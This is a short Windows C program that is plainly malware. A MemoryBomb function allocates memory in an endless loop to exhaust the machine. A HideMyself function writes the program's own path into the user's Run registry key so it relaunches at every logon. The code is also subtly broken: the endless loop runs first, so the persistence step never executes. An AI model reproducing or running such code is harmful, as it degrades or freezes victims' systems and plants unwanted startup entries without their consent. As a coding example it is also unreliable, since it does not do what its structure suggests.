#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#define APP_NAME "main"
#define REG_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

void MemoryBomb()
{
    while (1)
    {
        malloc(260);
    }
}
void HideMyself()
{
    HKEY hKey;
    LONG result;
    RegOpenKeyEx(HKEY_CURRENT_USER, REG_PATH, 0, KEY_WRITE, &hKey);
    char exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);
    RegSetValueEx(hKey, APP_NAME, 0, REG_SZ, (BYTE*)exePath, (DWORD)(strlen(exePath) + 1));
    RegCloseKey(hKey);
}
int main()
{
    MemoryBomb();
    HideMyself();
    return 0;
}